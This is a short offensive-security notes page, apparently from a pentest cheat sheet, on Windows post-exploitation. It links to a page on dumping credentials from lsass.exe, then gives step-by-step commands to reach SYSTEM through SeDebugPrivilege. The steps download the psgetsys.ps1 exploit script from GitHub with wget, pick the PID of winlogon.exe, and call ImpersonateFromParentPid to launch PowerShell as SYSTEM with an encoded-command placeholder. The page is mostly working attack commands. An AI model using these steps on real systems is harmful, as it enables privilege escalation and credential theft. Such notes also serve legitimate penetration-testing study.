## Extract credential from `lsass.exe`

See [Credentials in Memory]({{< relref "7. Post Exploitation/Credentials in Memory#lsa" >}})

## RCE as SYSTEM

[Github page](https://github.com/decoder-it/psgetsystem)

> The exploit elevate us to `SYSTEM` privilege by launching a child process, then use the `SeDebugPrivilege` to make the child process inherit the token of a `SYSTEM` process and impersonate it

Download the exploit script and transfer to target machine

```sh
wget https://raw.githubusercontent.com/decoder-it/psgetsystem/refs/heads/master/psgetsys.ps1
```

Then we choose a process running as `SYSTEM`. `winlogon.exe` is a good choice.

Copy the PID

```cmd
tasklist
```

Then run exploit

```powershell
. .\psgetsys.ps1
ImpersonateFromParentPid -ppid 600 -command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -cmdargs "-e "
```
